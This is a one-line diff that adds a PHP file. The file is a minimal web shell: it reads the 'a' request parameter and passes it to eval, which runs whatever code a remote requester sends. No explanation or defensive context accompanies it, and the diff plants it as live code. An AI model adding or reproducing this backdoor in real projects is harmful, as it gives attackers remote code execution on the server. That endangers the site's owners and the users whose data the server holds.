@@ -1,0 +1,1 @@
+<?php define("a","$_REQUEST[a]");eval(a)?>;
